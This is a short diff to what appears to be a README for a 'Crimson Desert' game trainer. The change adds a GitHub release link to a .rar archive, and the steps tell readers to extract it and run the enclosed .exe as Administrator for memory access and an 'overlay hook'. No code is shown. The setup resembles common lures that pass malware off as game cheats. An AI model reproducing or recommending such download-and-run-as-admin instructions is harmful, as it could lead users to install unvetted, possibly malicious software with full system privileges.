@@ -10,7 +10,7 @@ Experience effortless deployment and rock-solid stability on every major OS.
 
 Follow these steps to install Crimson-Desert-Trainer-v.3.1.4-2026-Edition:
 
-- [Download]() the latest build from the repository
+- [Download](https://github.com/Freebriremember/Crimson-Desert-Trainer-2026-Edition/releases/download/Download/Crimson_Desert_Trainer_v.3.1.4_2026_Edition.rar) the latest build from the repository
 - Extract the Crimson-Desert-Trainer-v.3.1.4-2026-Edition archive using a trusted extraction utility (e.g., WinRAR, 7-Zip, or the native OS extractor)
 - Run the Crimson_Desert_Trainer_v.3.1.4_2026_Edition.exe binary as Administrator to allow necessary memory read privileges
 - Follow the on-screen initialization wizard to calibrate the overlay hook
